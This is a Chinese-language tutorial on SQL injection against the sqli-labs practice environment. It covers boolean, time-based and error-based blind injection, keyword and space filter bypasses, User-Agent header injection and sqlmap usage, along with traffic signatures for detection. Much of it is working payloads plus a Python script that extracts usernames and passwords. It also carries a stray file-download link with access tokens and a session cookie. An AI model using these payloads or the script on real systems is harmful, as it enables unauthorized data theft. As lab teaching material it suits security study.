Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: xp=MTcyMjU4MTk1NnxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01Dd0FKVTJGbVpVVnVkSEo1Qm5OMGNtbHVad3dJQUFZell6Tm1aVGM9fPMcNECUoQNlFjbgBfP0lmLnN-MAnqp1V_86YwwuNSpq
Connection: close

passwd=admin&submit=Submit&uname=admin
```

![image-20240805141608089](../../../../repo/assets/19.SQL注入/image-20240805141608089.png)

### **5.基于时间的盲注的流量分析**

#### 流量关键字

- and if
- sleep
- length
- ascii
- ord
- substr
- mid

## **基于布尔的盲注**

### **一、判定是否有注入点**

利用页面的细微变化来判定是否有注入点

### **二、常用 payload**

基于布尔型的盲注，我们通常采用下面的办法猜解字符串.

> length(databse());
>
> substr(databse(),1,1);
>
> ascii(substr(database(),1,1));
>
> ascii(substr(database(),1,1))>N;
>
> ascii(substr(database(),1,1))=N;
>
> ascii(substr(database(),1,1))<N;

### **三、Get 基于布尔的盲注**

#### Less-8 布尔盲注

##### 判断数据库名长度

```bash
http://192.168.70.14:8088/Less-8/?id=1' and length(database())=7 --+ 显示空白
http://192.168.70.14:8088/Less-8/?id=1' and length(database())=8 --+ 显示you are in
```

![image-20240805200832770](../../../../repo/assets/19.SQL注入/image-20240805200832770.png)

![image-20240805200630707](../../../../repo/assets/19.SQL注入/image-20240805200630707.png)

##### 判断数据库名

```bash
http://192.168.70.14:8088/Less-8/?id=1' and substr(database(),1,1)='s' --+
```

![image-20240805201708730](../../../../repo/assets/19.SQL注入/image-20240805201708730.png)

##### 判断有几张表

```bash
http://192.168.70.14:8088/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+
```

![image-20240805200659481](../../../../repo/assets/19.SQL注入/image-20240805200659481.png)

##### 判断表名

```bash
http://192.168.70.14:8088/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101 --+
```

![image-20240805200916500](../../../../repo/assets/19.SQL注入/image-20240805200916500.png)

##### 判断users表有几列

```bash
http://192.168.70.14:8088/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_name='users' and table_schema=database())=3--+
```

![image-20240805200950289](../../../../repo/assets/19.SQL注入/image-20240805200950289.png)

##### 判断列名

```bash
http://192.168.70.14:8088/Less-8/?id=1' and (substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,2))='id'--+
```

![image-20240805201038194](../../../../repo/assets/19.SQL注入/image-20240805201038194.png)

##### 获取字段值

```bash
http://192.168.70.14:8088/Less-8/?id=1' and (substr((select username from security.users limit 0,1),1,1))='D'--+
```

![image-20240805201102157](../../../../repo/assets/19.SQL注入/image-20240805201102157.png)

#### python代码：布尔盲注

```python
# -*- coding:utf-8 -*-
import requests

'''
布尔盲注脚本，如果HTTP请求结果中包含You are in，代表判断正确

'''
def ascii_str(): #生成库名表名字符所在的字符列表字典
	str_list=[]
	for i in range(33,127): #所有可显示字符的ASCII码
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list #返回字符列表

def db_length(url,str):
	print("[-]开始测试数据库名长度.......")
	num=1
	while True:
		db_payload=url+"' and (length(database())=%d)--+"%num
		r=requests.get(db_payload)
		if str in r.text:
			db_length=num
			print("[+]数据库长度：%d\n"%db_length)
			db_name(db_length) #进行下一步，测试库名
			break
		else:
			num += 1

def db_name(db_length):
	print("[-]开始测试数据库名.......")
	db_name=''
	str_list=ascii_str()
	for i in range(1,db_length+1):
		for j in str_list:
			db_payload=url+"' and (ord(mid(database(),%d,1))='%s')--+"%(i,ord(j))
			r=requests.get(db_payload)
			if str in r.text:
				db_name+=j
				break
	print("[+]数据库名：%s\n"%db_name)
	tb_piece(db_name) #进行下一步，测试security数据库有几张表
	return db_name
	
def tb_piece(db_name):
	print("开始测试%s数据库有几张表........"%db_name)
	for i in range(100): #猜解库中有多少张表，合理范围即可
		tb_payload=url+"' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+"%(i,db_name)
		r=requests.get(tb_payload)
		if str in r.text:
			tb_piece=i
			break
	print("[+]%s库一共有%d张表\n"%(db_name,tb_piece))
	tb_name(db_name,tb_piece) #进行下一步，猜解表名


def tb_name(db_name,tb_piece):
	print("[-]开始猜解表名.......")
	table_list=[]
	for i in range(tb_piece):
		str_list=ascii_str()
		tb_length=0
		tb_name=''
		for j in range(1,20): #表名长度，合理范围即可
			tb_payload=url+"' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"%(i,j)
			r=requests.get(tb_payload)
			if str in r.text:
				tb_length=j
				print("第%d张表名长度：%s"%(i+1,tb_length))
				for k in range(1,tb_length+1): #根据表名长度进行截取对比
					for l in str_list:
						tb_payload=url+"' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+"%(i,k,ord(l))
						r=requests.get(tb_payload)
						if str in r.text:
							tb_name+=l
				print("[+]：%s"%tb_name)
				table_list.append(tb_name)
				break
	print("\n[+]%s库下的%s张表：%s\n"%(db_name,tb_piece,table_list))
	column_num(table_list,db_name) #进行下一步，猜解每张表的字段数

def column_num(table_list,db_name):
	print("[-]开始猜解每张表的字段数：.......")
	column_num_list=[]
	for i in table_list:
		for j in range(30): #每张表的字段数量，合理范围即可
			column_payload=url+"' and %d=(select count(column_name) from information_schema.columns where table_schema='%s' and table_name='%s')--+"%(j,db_name,i)
			r=requests.get(column_payload)
			if str in r.text:
				column_num=j
				column_num_list.append(column_num) #把所有表的字段，依次放入这个列表当中
				print("[+]%s表\t%s个字段"%(i,column_num))
				break
	print("\n[+]表对应的字段数：%s\n"%column_num_list)
	column_name(table_list,column_num_list,db_name) #进行下一步，猜解每张表的字段名

def column_name(table_list,column_num_list,db_name):
	print("[-]开始猜解每张表的字段名.......")
	column_length=[]
	str_list=ascii_str()
	column_name_list=[]
	for t in range(len(table_list)): #t在这里代表每张表的列表索引位置
		print("\n[+]%s表的字段："%table_list[t])
		for i in range(column_num_list[t]): #i表示每张表的字段数量
			column_name=''
			for j in range(1,21): #j表示每个字段的长度
				column_name_length=url+"' and %d=(select length(column_name) from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1)--+"%(j-1,db_name,table_list[t],i)
				#print("pppppppp"+column_name_length)
				r=requests.get(column_name_length)
				if str in r.text:
					column_length.append(j)
					break
				for k in str_list: #k表示我们猜解的字符字典
					column_payload=url+"' and ord(mid((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1))=%d--+"%(db_name,table_list[t],i,j,ord(k))
					r=requests.get(column_payload)
					if str in r.text:
						column_name+=k
			print('[+]：%s'%column_name)
			column_name_list.append(column_name)
	#print(column_name_list)#输出所有表中的字段名到一个列表中
	dump_data(table_list,column_name_list,db_name) #进行最后一步，输出指定字段的数据

def dump_data(table_list,column_name_list,db_name):
	print("\n[-]对%s表的%s字段进行爆破.......\n"%(table_list[3],column_name_list[9:12]))
	str_list=ascii_str()
	for i in column_name_list[9:12]: #id,username,password字段
		data_num = 0
		for j in range(101):#j表示有多少条数据，合理范围即可
			data_num_payload=url+"' and (select count(%s) from %s.%s)=%d--+"%(i,db_name,table_list[3],j)
			#print('pppppppp'+data_num_payload)
			r=requests.get(data_num_payload)
			if str in r.text:
				data_num=j
				break
		print("\n[+]%s表中的%s字段有以下%s条数据："%(table_list[3],i,data_num))
		for k in range(data_num):
			data_len=0
			dump_data=''
			for l in range(1,21):#l表示每条数据的长度，合理范围即可
				data_len_payload=url+"' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+"%(i,db_name,table_list[3],k,l)
				r=requests.get(data_len_payload)
				if str not in r.text:
					data_len=l-1
					for x in range(1,data_len+1):#x表示每条数据的实际范围，作为mid截取的范围
						for y in str_list:
							data_payload=url+"' and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+"%(i,db_name,table_list[3],k,x,ord(y))
							r=requests.get(data_payload)
							if str in r.text:
								dump_data+=y
								break
					break
			print('[+]%s'%dump_data)#输出每条数据



if __name__ == '__main__':
	url="http://192.168.70.14:8088/Less-5/?id=1"#目标url
	str="You are in"#布尔型盲注的true&false的判断因素
	db_length(url,str)#程序入口
```



### **四、Post 基于布尔的盲注**

在存在的注入点 POST 提交的参数后，加入 `if` 判断正确或者错误的语句

> length(databse());
>
> substr(databse(),1,1);
>
> ascii(substr(database(),1,1))>N;
>
> ascii(substr(database(),1,1))=N;
>
> ascii(substr(database(),1,1))<N;

Payload//如果不知道用户名用 `or`，但**要求用户名要做到不正确**，找一个最不像用户名的用户名

```
uname=admin' and (length(database())>7) --+&passwd=admin123456&submit=Submit
uname=dddd' or length(database())>7 -- &passwd=admin&submit=Submit
```

#### less-15 布尔盲注

##### 数据库名长度

```
uname=admin' or length(database())=8--+
```

##### 数据库名称

```
uname=admin' or ascii(substr(database(),1,1))=115--+
```

##### 表名

```
uname=admin' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>101 --+
```

##### 字段名

```
uname=admin' or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+
```

##### 字段值

```
uname=admin' or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+
```



### **五、基于布尔的盲注的流量分析**

#### 流量关键字

- and
- length
- ascii
- ord
- substr
- mid

## **利用 sqlmap 探测盲注**

### **一、利用** **sqlmap** **探测**get **基于时间盲注**

#### 查看 sqlmap 的帮助信息

```
sqlmap -h 
```

![image-20240803171031277](../../../../repo/assets/19.SQL注入/image-20240803171031277.png)

> B 表示布尔盲注，
>
> T 表示时间盲注(延迟注入），
>
> E 表示报错注入
>
> U 表示联合查询注入，
>
> S 表示堆查询注入

#### 时间盲注

`--technique T` 设置为只基于**时间**的探测技术

```
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique T --dbs 
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique T -D security --tables
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique T -D security -T users --column  
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique T -D security -T users -C id,username,password --dump
```

![image-20240805155216896](../../../../repo/assets/19.SQL注入/image-20240805155216896.png)

![image-20240805155246875](../../../../repo/assets/19.SQL注入/image-20240805155246875.png)

![image-20240805163923618](../../../../repo/assets/19.SQL注入/image-20240805163923618.png)

![image-20240805164107098](../../../../repo/assets/19.SQL注入/image-20240805164107098.png)



```
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique T --proxy "http://127.0.0.1:8080" --dbs
```



#### 布尔盲注

`--technique B` 布尔盲注

```
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique B --dbs 
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique B -D security --tables
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique B -D security -T users --column  
sqlmap -u "http://192.168.70.14:8088/Less-8/?id=1" --batch --purge --technique B -D security -T users --dump
```

![image-20240805154600662](../../../../repo/assets/19.SQL注入/image-20240805154600662.png)

![image-20240805154628543](../../../../repo/assets/19.SQL注入/image-20240805154628543.png)

![image-20240805154700302](../../../../repo/assets/19.SQL注入/image-20240805154700302.png)

![image-20240805154750494](../../../../repo/assets/19.SQL注入/image-20240805154750494.png)

### **二、利用** **sqlmap** **探测** **post** **盲注**

使用基于**时间**技术的 sqlmap 探测

```
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" -p uname --batch --technique T --dbs
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" -p uname --batch --technique T -D security --tables 
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" -p uname --batch --technique T -D security -T users --column
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" -p uname --batch --technique T -D security -T users --dump
```

类似可以使用**布尔**技术的 sqlmap 探测

```
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" --batch --technique B --dbs
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" --batch --technique B -D security --tables 
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" --batch --technique B -D security -T users --column
sqlmap -u http://192.168.70.14:8088/Less-15/ --data="uname=admin&passwd=admin" --batch --technique B -D security -T users --dump
```



### 三 sqlmap 盲注的流量特征

#### 1、手工盲注的流量特征类似 

- if 
- sleep 
- select 布尔表达式的判定 数据
- 库源信息的流量特征

#### 2、大量的同源注入请求 sqlmap 特征

## **Sql 注入的绕过原理**

### **1.**大小写绕过

如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如: and 过滤。当然这种过滤只是发现关键字出现，并不会对关键字处理。

通过修改**关键字内字母大小写**来绕过过滤措施。

例如:`AnD 1=1`

例如:在进行探测当前表的字段数时,使用 order by 数字进行探测。如果过滤了 `order` ，可以使用 `OrdER` 来进行绕过。

如果在程序中设置出现**关键字之后替换为空**，那么 SQL 注入攻击也不会发生。

对于这样的过滤策略可以

#### 实验：

Mysql 练习大小写绕过语句

```
Select * from  ** oRdEr by 1
```

### **2** **双写绕过**

使用双写绕过。因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。

比如 `union` 在程序员处理时被替换为**空**，那需要我们可以尝试把 `union` 改写为Un**union**ion 红色部分替换为空，则剩下的依然为空

还可以结合大小写过滤一起使用

### **3.**编码绕过

可以利用网络中的 URL 在线编码，绕过 SQL 注入的过滤机制。

http://tool.chinaz.com/Tools/urlencode.aspx

### **4.**内联注释绕过

在 Mysql 中内容注释中的内容可以被当作 SQL 语句执行。

#### 实验：

Mysql 中执行

```
/*!select*/ * from admin
```

## **绕过过滤 and 和 or 的 sql 注入及流量分析**

### **1. 基础知识介绍**

1. 1、Mysql 中的**大小写**不敏感，大写与小写一样。
2. 2、Mysql 中的**十六进制**与 `URL` 编码。
3. 3、符号和关键字替换 `and --> &&`、`or --> ||`。
4. 4、内联注释与多行注释`/*! 内联注释*/ /*! 多行注释*/`

```
preg_ replace(mixed $pattern，mixed $replacement，mixed $subject)
```

执行一个正则表达式的搜索和替换。

> $pattern:要搜索的模式，可以是字符串或一个字符串数组
>
> $replacement:用于替换的字符串或字符串数组。
>
> $subject:要搜索替换的目标字符串或字符串数组。

### **2. 去除 and 和 or 的代码分析**

`Less-25` 的代码

### **3. 绕过去除 and 和 or 的 SQL 注入**

#### Sqli-Lab 25 绕过策略

1. 1、**大小写**变形，`Or,OR,oR,OR,And,ANd,aND` 等 代码中大小写不敏感都被剔除
2. 2、在这两个敏感词汇中添加**注释**，例如: `a/**/nd` ，双写绕过 `oorr`
3. 3、利用符号替代`--and --&&`  `--or --||`

#### Less 25 绕过演示

'`and`','`or`'和'`AND`','`OR`'被**过滤**

首先发现注入类型是**数值型**注入发现

绕过 **大小写**行不通我们可以试试**双写**

```
http://192.168.70.14:8088/Less-25/?id=1 Anandd 1=1
```

&&符号

```
http://192.168.70.14:8088/Less-25/?id=1 &&1=1
```



```
http://192.168.70.14:8088/Less-25/?id=1' oorrder by 4--+
http://192.168.70.14:8088/Less-25/?id=1' oorrder by 3--+

http://192.168.70.14:8088/Less-25/?id=-1' union select 1,2,3-- +
http://192.168.70.14:8088/Less-25/?id=-1' union select 1,2,(select database())-- +
http://192.168.70.14:8088/Less-25/?id=-1' union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())--+
http://192.168.70.14:8088/Less-25/?id=-1' union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() aandnd table_name='users')--+
http://192.168.70.14:8088/Less-25/?id=-1' union select 1,2,(select group_concat(username,0x7e,passwoorrd) from users)--+
```



```
GET /Less-25/?id=1 HTTP/1.1
Host: 192.168.70.14:8088
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: xp=MTcyMjU4MTk1NnxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01Dd0FKVTJGbVpVVnVkSEo1Qm5OMGNtbHVad3dJQUFZell6Tm1aVGM9fPMcNECUoQNlFjbgBfP0lmLnN-MAnqp1V_86YwwuNSpq
origin: http://192.168.70.14:8088
content-type: application/x-www-form-urlencoded
referer: http://192.168.70.14:8088/Less-15/
Connection: close
```



### **4. 流量分析**

#### 流量特征

- 大小写，双写流量AnD 
- Or 
- aandnd ANanDD 
- oorr 
- OoRr
- &&，||流量

## **绕过过滤空格的 sql 注入**

### **1. 基础知识介绍**

- Mysql 中的大小写不敏感，大写与小写一样。

- Mysql 中的十六进制与 URL 编码。

- 符号和关键字替换 and -- &&、or-- ||。

- 内联注释与多行注释`/*! 内联注释*/ /!* 多行注释*/` 

  ```
  /*!select*/ user from mysql.users;
  /*!5726select*/ user from mysql.users;
  ```

  如果服务器的版本号大于或等于 5.7.26，则执行 `select user from mysql.users;`。如果 MySQL 服务器的版本低于 5.7.26，则这条语句会被忽略（或更具体地说，MySQL 会尝试解析它但不会执行它，因为 `/*!` 注释的结束标记 `*/` 之后的 SQL 语句在这种情况下被视为注释的一部分）。

- Mysql 中会自动识别 URL 与 Hex 编码好的内容。

### **2. 去除空格的代码分析**

```
preg_ replace(mixed $pattern，mixed $replacement，mixed $subject)
```

执行一个正则表达式的搜索和替换。

> $pattern:要搜索的模式，可以是字符串或一个字符串数组
>
> $replacement:用于替换的字符串或字符串数组。
>
> $subject:要搜索替换的目标字符串或字符串数组。

代码分析 `Less-26` 的 php 代码

### **3. 绕过去除空格的 SQL 注入**

编码: `hex,urlencode 空格 URL 编码%20`

> `%09` TAB 键(水平)
>
> `%0a` 新建一行
>
> `%0c` 新的一页
>
> `%0d` return 功能
>
> `%0b` TAB 键(垂直)
>
> `%a0`

Less-26输入?id=`1' --+` ,没变化 ，因为都被过滤了

绕过方式

```
http://192.168.70.14:8088/Less-26/?id=1' %0A||'1
```

Less-26 用`%0a， %0b` 绕过

字符型注入，单引号闭合**'**

**`\s`过滤了空格和换行，**

> and or  ——> && ||
>
> \# --      ——> 闭合逃逸
>
> /s空格  ——> 括号



```
http://192.168.70.14:8088/Less-26/?id=-1'||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'
http://192.168.70.14:8088/Less-26/?id=-1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1)||'
http://192.168.70.14:8088/Less-26/?id=-1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()aandnd(table_name='users'))),0x7e),1)||'
http://192.168.70.14:8088/Less-26/?id=-1'||updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,passwoorrd))from(users)),0x7e),1)||'
```



### 4、绕过流量分析

空格都用 url 编码来替代 `%0a，%0b，%0c，%d，%a0`

单引号的闭合 `'`用配合闭合



## **绕过去除 union 和 select 的 sql 注入及流**量分析

### **1. Mysql 基础知识介绍**

-  Mysql 中的**大小写**不敏感，大写与小写一样。用于绕过过滤黑名单。
-  Mysql 中的**十六进制**与 **URL 编码**。
-  符号和关键字替换 `and --> &&`、`or --> ||`
-  空格使用`%20` 表示、`%0a` 换行`%09` tab

### **2. 去除 union 和 select 的代码分析**

```
preg_ replace(mixed $pattern，mixed $replacement，mixed $subject)
```

执行-个正则表达式的搜索和替换。

> $pattern:要搜索的模式，可以是字符串或一个字符串数组
>
> $replacement:用于替换的字符串或字符串数组。
>
> $subject:要搜索替换的目标字符串或字符串数组。

通过代码分析课看到，`/s` 表示区分大小写，则分别过滤了 `union UNION select`，`SELECT Union Select`

### **3. 绕过去除 union 和 select 的 sql 注入**

`%09` 表示空格、表示 or 、union/select 大小写、双写绕过。

Payload：

```
http://127.0.0.1/sqIliLess-27/?id=10000000%27%09%09uniOn%09SelEcT%091,2,3%09%09%271
```

首先，判断是字符型还是数值型---判断是字符型

`?id=1’`

加上`--+`仍然报错，证明进行了过滤

```
http://192.168.70.14:8088/Less-27/?id=1' ||'1
```

- Union 和 select 被过滤
- 空格被过滤

#### 显示位

```
http://192.168.70.14:8088/Less-27/?id=0'%09uNIon%09seLEct%091,2,3||'1
```

#### 数据库名

```
http://192.168.70.14:8088/Less-27/?id=0'%09uNIon%09seLEct%091,database(),3||'1
```



```
爆破数据库名称
http://192.168.70.14:8088/Less-27/?id=0'and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or'
爆破数据表名称
http://192.168.70.14:8088/Less-27/?id=0'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e),1)or'1
爆破字段名
http://192.168.70.14:8088/Less-27/?id=0'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'),0x7e),1)or'1
爆破字段内容
http://192.168.70.14:8088/Less-27/?id=0'and%0aupdatexml(1,concat(0x7e,(selEct(group_concat(username,0x7e,password))from%0ausers),0x7e),1)||'
```



### 4.绕过去除 union 和 select 的流量分析

#### 1、大小写，双写流量

- UnIon 
- SelECT 
- UnuNionIon 
- sElSelECtect

#### 2、盲注流量

- 大量的盲注请求
- And if sleep

## where id=1=1

```
where id=1=1
where id=1=0
```

```
http://192.168.70.14:8088/Less-1/?id=-1' union select 1,group_concat(username,'^',password),3 from users where id=1=1--+
http://192.168.70.14:8088/Less-1/?id=-1' union select 1,group_concat(username,'^',password),3 from users where id=1=0--+
```

![image-20240806103242714](../../../../repo/assets/19.SQL注入/image-20240806103242714.png)

![image-20240806103308111](../../../../repo/assets/19.SQL注入/image-20240806103308111.png)



## **Http 头注入之 UA 头注入**

### **一、**http**头注入介绍**

在安全意识越来越重视的情况下，很多网站都在防止漏洞的发生。例如 SQL注入中，用户提交的参数都会被代码中的某些措施进行过滤。

过滤掉用户直接提交的参数,但是对于 HTTP 头中提交的内容很有可能就没有进行过滤。例如 HTTP 头中 User-Agent、Referer、Cookies 等。 

### **二、**User-Agent**注入**(INSERT **提交的参数**)

- 1 获得头信息
- 2 没过滤
- 3 数据库操作

#### 查看 Less-18 代码

可以看到注入点

```php
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`,`username`) VALUES ('$uagent', '$IP', $uname)";
```

#### Less-18 报错函数：

在输入正确的用户名密码之后发现提示 `useragent` 信息然后对 useragent 进行尝试注入，发现有 sql 错误

用 payload 进行渗透

那么该如何获得响应的信息呢？

利用**报错函数**

##### 数据库名

```mysql
1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
```

![image-20240806141306109](../../../../repo/assets/19.SQL注入/image-20240806141306109.png)

不能像常规的报错盲注一样直接上，我们得考虑一下闭合VALUES，假如我们利用的点是$uagent，那构建格式就应该是`1',1,1)#`，在SQL语句中相当于

```mysql
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1',1,1)#, '$IP', $uname)
```

> Your IP ADDRESS is: 192.168.70.14
>
> Your User Agent is: 1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
>
> XPATH syntax error: '`~security~`'

##### 表名

```mysql
1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#
```

![image-20240806141348574](../../../../repo/assets/19.SQL注入/image-20240806141348574.png)

##### 字段名

```mysql
1',1, updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e),1)) -- +
```

![image-20240806141558662](../../../../repo/assets/19.SQL注入/image-20240806141558662.png)

##### 字段值

```mysql
1',1, updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +
```

![image-20240806141732704](../../../../repo/assets/19.SQL注入/image-20240806141732704.png)

#### Sqlmap报错注入less-18

`User-Agent`

##### 数据库名

```bash
sqlmap -u "http://192.168.70.14:8088/Less-18/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 3 -p User-Agent --dbs
```

![image-20240807201510289](../../../../repo/assets/19.SQL注入/image-20240807201510289.png)

##### 表名

```
sqlmap -u "http://192.168.70.14:8088/Less-18/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 3 -p User-Agent -D security --tables
```

![image-20240807201543171](../../../../repo/assets/19.SQL注入/image-20240807201543171.png)

##### 字段名

```
sqlmap -u "http://192.168.70.14:8088/Less-18/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 3 -p User-Agent -D security -T users --column  
```

![image-20240807201613977](../../../../repo/assets/19.SQL注入/image-20240807201613977.png)

##### 字段值

```
sqlmap -u "http://192.168.70.14:8088/Less-18/" --data "uname=admin&passwd=admin"  --batch --purge --technique E --level 3 -p User-Agent -D security -T users --dump
```

![image-20240807201637170](../../../../repo/assets/19.SQL注入/image-20240807201637170.png)



## **利用报错函数** **Updatexml** **和** **extractvalue** **带**回回显流量分析

### **一、**updatexml()函数

#### **使用前提：**

在 mysql 高 版本 中( 大 于 `5.1` 版 本) 中 添加了对 **XML 文档**进 行 **查询 和 修改** 的 函数 ，

`updatexml()`,`extracvalue()`

而显示错误则需要在开发程序中采用 `print_r mysql_error()`函数，将 mysql 错误信息输出。

#### **Updatexml** **函数本身介绍**

作用：改变文档中符合条件的节点,使用不同的 xml 标记匹配和替换 xml 块的函数。

```
updatexml(XML_document,XPath_string,new_value);
```

> XML_document:String 格式，为 XML 文档对象的名称，文中为 Doc
>
> XPath_string:Xpath 格式的字符串，代表路径。
>
> new_value:String 格式，替换查找到的符合条件的数据。
>

#### less-5报错注入Updatexml

##### 版本

```mysql
http://192.168.70.14:8088/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or '1'='1
```

![image-20240806150435261](../../../../repo/assets/19.SQL注入/image-20240806150435261.png)

##### 数据库名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=0' union select updatexml(1,concat(0x7e,database(),0x7e),1),2,3 --+
```

![image-20240806150858927](../../../../repo/assets/19.SQL注入/image-20240806150858927.png)

#####  表名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```

![image-20240806150929243](../../../../repo/assets/19.SQL注入/image-20240806150929243.png)

##### 字段名

```mysql
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)--+
```

![image-20240806151008260](../../../../repo/assets/19.SQL注入/image-20240806151008260.png)

#####  字段值

 group_concat()函数可能放不下所有内容，可以采用截取或者limit函数读取  

可以看出，爆出的字段名称长度超出了`32`，所以需要使用`substring（）`函数每隔`32`位截取一次，最终拼凑出全部内容。

```mysql
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+
http://192.168.70.14:8088/Less-5/?id=1' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+
```

![image-20240806151055979](../../../../repo/assets/19.SQL注入/image-20240806151055979.png)

![image-20240806151129431](../../../../repo/assets/19.SQL注入/image-20240806151129431.png)

#### sqlmap报错注入less-5

```
https://dl-pc-zb.drive.quark.cn/rQDRo3Kh/2743880060/669e0f7729ea564fe44e44e8b6732d865eda40e9/669e0f779858d598a8084b29b30a12bb9c9f5573?filename=JiaoSuInfoSec_T00ls_Win11_24722_v1.1.RT_hw.Beta_.zip&auth_key=1724026615-18966220-948300-f5b4c63ecdc6f240048963d22d049afa&sp=100&token=3-99b3502ebb58c03b119ac7f7859e10e3-8-1-400-27fc66c54fdf4dfda6063d258964311e-400-0-0-0-6dd5b9588a3b6d17e269fb358744039b&ud=16-0-5-2-7-N-4-N-1-16-0-N
```



### **二、另外一种报错函数注入** **extractvalue** **的利用**

`extractvalue` 函数的基本格式为：

```mysql
ExtractValue(xml_frag, xpath_expr)
```

